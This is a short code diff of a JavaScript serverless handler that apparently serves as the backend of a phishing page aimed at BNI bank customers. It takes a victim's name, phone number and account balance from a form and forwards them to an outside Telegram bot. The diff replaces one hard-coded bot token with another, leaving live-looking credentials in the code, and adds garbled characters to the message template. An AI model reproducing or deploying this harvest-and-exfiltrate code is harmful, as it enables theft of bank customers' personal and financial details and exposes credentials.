@@ -3,7 +3,7 @@ export default async function handler(req, res) {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
-    const telegramId = '7785695206:AAHDvRmyKRqcwx-3hfhBMjvnxqa47vl1rdg';
+    const telegramId = '7480495756:AAF-WzTi90lBKoVAVBmjwxAX1OupjVwI02s';
     const botToken = '7869205757';
 
     const { a, b, c } = req.body;
@@ -12,9 +12,9 @@ export default async function handler(req, res) {
 ______________________________
 RES BNI new
 ______________________________
-¡H NAME : ${a}
-¡H NOMOR : ${b}
-¡H SALDO : ${c}
+Â¡H NAME : ${a}
+Â¡H NOMOR : ${b}
+Â¡H SALDO : ${c}
 ______________________________`;
 
     const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
